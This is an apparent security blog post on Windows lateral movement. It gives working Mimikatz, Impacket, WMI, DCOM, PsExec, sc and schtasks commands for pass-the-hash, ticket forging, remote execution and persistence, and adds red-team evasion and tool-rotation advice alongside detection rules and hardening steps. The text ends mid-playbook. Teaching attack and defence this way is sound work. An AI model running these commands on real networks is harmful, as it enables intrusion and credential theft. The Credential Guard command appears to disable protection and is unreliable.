# Advanced Lateral Movement Techniques

*Published on January 5, 2025 by Husam Gameel (Oppenheim3r)*

Lateral movement is a critical phase in the cyber kill chain where attackers expand their foothold within a compromised network. This comprehensive analysis explores advanced techniques used by sophisticated threat actors and provides insights for both red team operations and defensive strategies.

## Understanding Lateral Movement

Lateral movement refers to the techniques that adversaries use to move through a network, accessing additional systems and resources while maintaining persistence. This phase typically occurs after initial compromise and privilege escalation.

### MITRE ATT&CK Framework Context

According to the MITRE ATT&CK framework, lateral movement encompasses several techniques:

- **T1021**: Remote Services
- **T1047**: Windows Management Instrumentation
- **T1076**: Remote Desktop Protocol
- **T1028**: Windows Remote Management
- **T1077**: Windows Admin Shares

## Common Lateral Movement Techniques

### 1. Pass-the-Hash (PtH)

Pass-the-Hash attacks exploit the Windows authentication protocol by using captured password hashes instead of plaintext passwords.

```powershell
# Using Mimikatz for Pass-the-Hash
mimikatz.exe "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe"

# Using Impacket's psexec
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee administrator@192.168.1.100
```

### 2. Pass-the-Ticket (PtT)

This technique involves stealing Kerberos tickets and reusing them for authentication.

```powershell
# Extract tickets using Mimikatz
mimikatz.exe "sekurlsa::tickets /export"

# Inject ticket for lateral movement
mimikatz.exe "kerberos::ptt ticket.kirbi"

# Access remote system
dir \\target-server\c$
```

### 3. Golden Ticket Attacks

Golden tickets provide persistent access by forging Kerberos TGTs using the KRBTGT account hash.

```powershell
# Create golden ticket
mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ticket:golden.kirbi"

# Use golden ticket
mimikatz.exe "kerberos::ptt golden.kirbi"
```

### 4. Silver Ticket Attacks

Silver tickets target specific services by forging TGS tickets using service account hashes.

```powershell
# Create silver ticket for CIFS service
mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:fileserver.corp.local /service:cifs /rc4:service_account_hash /ticket:silver.kirbi"
```

## Advanced Techniques

### WMI-based Lateral Movement

Windows Management Instrumentation provides powerful capabilities for remote system management and can be abused for lateral movement.

```powershell
# WMI command execution
wmic /node:"192.168.1.100" /user:"domain\administrator" /password:"password" process call create "cmd.exe /c whoami > c:\temp\output.txt"

# PowerShell WMI execution
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc <base64_encoded_command>" -ComputerName "target-server" -Credential $cred
```

### PowerShell Remoting

PowerShell remoting enables interactive and non-interactive remote command execution.

```powershell
# Enable PowerShell remoting
Enable-PSRemoting -Force

# Create remote session
$session = New-PSSession -ComputerName "target-server" -Credential $cred

# Execute commands
Invoke-Command -Session $session -ScriptBlock { Get-Process }

# Interactive session
Enter-PSSession -Session $session
```

### DCOM-based Lateral Movement

Distributed COM objects can be leveraged for remote code execution.

```powershell
# Using MMC20.Application DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "192.168.1.100"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
```

## Living Off The Land Techniques

### Using Built-in Windows Tools

Attackers often use legitimate Windows tools to avoid detection:

```batch
# PsExec for remote execution
psexec.exe \\target-server -u domain\administrator -p password cmd.exe

# SC for service manipulation
sc \\target-server create malicious-service binpath= "c:\temp\malware.exe"
sc \\target-server start malicious-service

# WMIC for remote process creation
wmic /node:target-server process call create "powershell.exe -WindowStyle Hidden -Command <payload>"
```

### Scheduled Tasks

Creating scheduled tasks on remote systems for persistence and execution:

```powershell
# Create remote scheduled task
schtasks /create /tn "SystemUpdate" /tr "powershell.exe -WindowStyle Hidden -Command <payload>" /sc daily /st 09:00 /s target-server /u domain\administrator /p password

# Execute task immediately
schtasks /run /tn "SystemUpdate" /s target-server /u domain\administrator /p password
```

## Detection Strategies

### Network Monitoring

Monitor for suspicious network patterns:

```yaml
# Sigma rule for lateral movement detection
title: Suspicious Network Logon
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
  timeframe: 5m
  condition: selection | count() > 10
level: medium
```

### Process Monitoring

Track suspicious process creation and command-line arguments:

```python
# Sysmon configuration for process monitoring
def detect_lateral_movement_processes():
    suspicious_processes = [
        'psexec.exe',
        'wmic.exe',
        'powershell.exe',
        'cmd.exe'
    ]
    
    suspicious_cmdlines = [
        '/node:',
        '-ComputerName',
        '\\\\.*\\admin$',
        'Invoke-Command'
    ]
    
    # Monitor for combinations of suspicious processes and command lines
    for event in process_events:
        if (event.process_name in suspicious_processes and
            any(pattern in event.command_line for pattern in suspicious_cmdlines)):
            trigger_alert("Potential Lateral Movement", event)
```

### Authentication Monitoring

Monitor authentication events for anomalies:

```sql
-- Detect pass-the-hash attempts
SELECT 
    SourceIP,
    TargetUser,
    COUNT(*) as LoginCount
FROM SecurityEvents 
WHERE EventID = 4624 
    AND LogonType = 3 
    AND AuthenticationPackage = 'NTLM'
    AND ProcessName = 'NtLmSsp'
GROUP BY SourceIP, TargetUser
HAVING COUNT(*) > 5
```

## Prevention and Mitigation

### Network Segmentation

Implement proper network segmentation to limit lateral movement:

```yaml
# Network segmentation strategy
DMZ:
  - Web servers
  - Email servers
  - DNS servers
  
Internal_Network:
  - User workstations
  - File servers
  - Print servers
  
Critical_Assets:
  - Domain controllers
  - Database servers
  - Backup systems

# Firewall rules between segments
Rules:
  - DMZ -> Internal: Deny all except specific services
  - Internal -> Critical: Require authentication and logging
  - Critical -> External: Deny all outbound except updates
```

### Privileged Access Management

Implement PAM solutions to control administrative access:

```powershell
# Just-in-Time (JIT) access example
function Request-PrivilegedAccess {
    param(
        [string]$TargetSystem,
        [string]$Justification,
        [int]$DurationHours = 1
    )
    
    # Request approval
    $approval = Submit-AccessRequest -Target $TargetSystem -Reason $Justification
    
    if ($approval.Approved) {
        # Grant temporary access
        Grant-TemporaryAccess -User $env:USERNAME -Target $TargetSystem -Duration $DurationHours
        
        # Log access
        Write-AuditLog "Privileged access granted to $env:USERNAME for $TargetSystem"
    }
}
```

### Credential Protection

Implement credential protection mechanisms:

```powershell
# Enable Credential Guard
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} loadoptions DISABLE-LSA-ISO

# Configure LSASS protection
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Disable WDigest
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f
```

## Red Team Considerations

### Operational Security (OPSEC)

Maintain stealth during lateral movement operations:

```python
# OPSEC-aware lateral movement
class StealthyLateralMovement:
    def __init__(self):
        self.delay_between_actions = 300  # 5 minutes
        self.max_concurrent_sessions = 2
        self.avoid_detection_hours = [9, 17]  # Business hours
    
    def move_laterally(self, target_hosts):
        for host in target_hosts:
            # Check if it's safe to proceed
            if self.is_safe_time() and self.can_proceed():
                self.establish_connection(host)
                time.sleep(self.delay_between_actions)
            else:
                self.wait_for_safe_window()
    
    def is_safe_time(self):
        current_hour = datetime.now().hour
        return not (self.avoid_detection_hours[0] <= current_hour <= self.avoid_detection_hours[1])
```

### Tool Rotation

Rotate tools and techniques to avoid signature-based detection:

```yaml
# Tool rotation strategy
Week_1:
  - Primary: PowerShell Empire
  - Secondary: Cobalt Strike
  - Backup: Custom tools

Week_2:
  - Primary: Metasploit
  - Secondary: Custom PowerShell scripts
  - Backup: Living off the land techniques

Week_3:
  - Primary: Custom C# tools
  - Secondary: Python-based tools
  - Backup: WMI/DCOM techniques
```

## Blue Team Response

### Incident Response Playbook

Develop specific playbooks for lateral movement incidents:

```yaml
# Lateral Movement Response Playbook
